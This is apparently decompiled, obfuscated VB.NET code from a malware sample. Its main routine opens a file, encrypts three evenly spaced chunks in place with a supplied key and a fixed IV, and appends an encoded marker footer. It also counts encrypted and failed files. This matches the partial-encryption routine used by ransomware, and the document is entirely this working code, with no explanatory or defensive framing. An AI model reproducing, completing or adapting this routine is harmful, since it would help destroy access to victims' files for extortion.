Imports System
Imports System.IO
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards
Imports UiJYiNvGWeAgvdh

Namespace jtAYXTgtXeY
	' Token: 0x02000021 RID: 33
	Friend NotInheritable Class SVYTKltyMvfN
		' Token: 0x060000D6 RID: 214 RVA: 0x0000F1FC File Offset: 0x0000D3FC
		Public Shared Function KautfDBVaZgaZi(long_0 As Long) As Integer
			Return CInt(long_0)
		End Function

		' Token: 0x060000D7 RID: 215 RVA: 0x0000F210 File Offset: 0x0000D410
		Public Shared Function TbUIGCUJHdi(yxCopfGtXqG As String, LcBoiYXLfawd As String, AliFoJqnosy As String, Optional wDRKlwZNjxP As Byte() = Nothing) As Boolean
			Dim flag As Boolean
			Try
				Using fileStream As FileStream = New FileStream(yxCopfGtXqG, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
					Dim num As Integer = SVYTKltyMvfN.KautfDBVaZgaZi(fileStream.Length) / 3
					If num < 0 Then
						num *= -1
					End If
					Dim num2 As Integer = 0
					Try
						num2 = Convert.ToInt32(LcBoiYXLfawd) * Convert.ToInt32(fileStream.Length) / 100 / 2
						If num2 < 0 Then
							num2 *= -1
						End If
					Catch
						num2 = 107374182
					End Try
					If num <= num2 - Convert.ToInt32(LcBoiYXLfawd) * 1024 * 1024 Then
						num2 = (num - Convert.ToInt32(LcBoiYXLfawd) * 1024 * 1024) / 10
					End If
					Dim num3 As Integer = CInt(Math.Round(CDbl(num2) / CDbl(32F), MidpointRounding.AwayFromZero)) * 32
					For i As Integer = 0 To 3 - 1
						Dim array As Byte() = SVYTKltyMvfN.JODQwmMMzIFSX(yxCopfGtXqG, fileStream, num3, num * i)
						Dim array2 As Byte()
						If Not JWIADYxDQdhHy.CpKJVfXcbzad Then
							array2 = hYjsHlYUDnTPL.TxrnXctERKmWIPl(array, Encoding.ASCII.GetBytes(AliFoJqnosy), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
						Else
							array2 = PyacUIFvzjF.GKlrikIYVckkl(array, Encoding.ASCII.GetBytes(AliFoJqnosy), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
						End If
						SVYTKltyMvfN.VxNYckCQfVyxFbk(yxCopfGtXqG, fileStream, array2, num * i)
					Next
				End Using
				Dim array3 As Byte()
				If Not JWIADYxDQdhHy.csOkMUvFRZv Then
					array3 = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107399219)) + JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107400893)) + Convert.ToString(LcBoiYXLfawd) + JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107400893)))
				Else
					array3 = Encoding.ASCII.GetBytes(JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107399219)) + JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107400884)) + Convert.ToString(LcBoiYXLfawd) + JWIADYxDQdhHy.aPAxwuEVwvWnky(SVYTKltyMvfN.getString_0(107400884)))
				End If
				If Not JWIADYxDQdhHy.csOkMUvFRZv Then
					Using fileStream2 As FileStream = New FileStream(yxCopfGtXqG, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						fileStream2.Write(array3, 0, array3.Length)
						GoTo IL_22F
					End Using
				End If
				Using fileStream3 As FileStream = New FileStream(yxCopfGtXqG, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
					fileStream3.Write(wDRKlwZNjxP, 0, wDRKlwZNjxP.Length)
					fileStream3.Write(array3, 0, array3.Length)
				End Using
				IL_22F:
				GoTo IL_2B8
			Catch ex As Exception
				If JWIADYxDQdhHy.WkkVnLAdbtG Then
					Try
						File.AppendAllText(JWIADYxDQdhHy.PhOHjwgFpwoPkI, String.Concat(New String() { SVYTKltyMvfN.getString_0(107386113), yxCopfGtXqG, SVYTKltyMvfN.getString_0(107399174), ex.Message, SVYTKltyMvfN.getString_0(107396417) }))
					Catch ex2 As Exception
					End Try
				End If
				JWIADYxDQdhHy.WuLujtLeXYYG += 1
				flag = False
			End Try
			Return flag
			IL_2B8:
			JWIADYxDQdhHy.LFhiMkBTtnH += 1
			Return True
		End Function

		' Token: 0x060000D8 RID: 216 RVA: 0x0000F578 File Offset: 0x0000D778
		Public Shared Function JODQwmMMzIFSX(DOlAEuuQkwL As String, xNgnaRIbRcUAj As FileStream, zZvtnYsDHZAUmPi As Integer, Optional KYLsoyDZxkNlmxMd As Integer = 0) As Byte()
			Dim array As Byte() = New Byte(zZvtnYsDHZAUmPi - 1) {}
			xNgnaRIbRcUAj.Position = CLng(KYLsoyDZxkNlmxMd)
			xNgnaRIbRcUAj.Read(array, 0, zZvtnYsDHZAUmPi)
			Return array
		End Function

		' Token: 0x060000D9 RID: 217 RVA: 0x00002BA8 File Offset: 0x00000DA8
		Public Shared Sub VxNYckCQfVyxFbk(hWaTwkDfQfIhb As String, LcsbTtuKtVOww As FileStream, YAlGrrhMpYwx As Byte(), Optional WekOJwsnBh As Integer = 0)
			LcsbTtuKtVOww.Position = CLng(WekOJwsnBh)
			LcsbTtuKtVOww.Write(YAlGrrhMpYwx, 0, YAlGrrhMpYwx.Length)
		End Sub

		' Token: 0x060000DB RID: 219 RVA: 0x00002BBD File Offset: 0x00000DBD
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(SVYTKltyMvfN))
		End Sub

		' Token: 0x040000BE RID: 190
		<NonSerialized()>
		Friend Shared getString_0 As GetString
	End Class
End Namespace
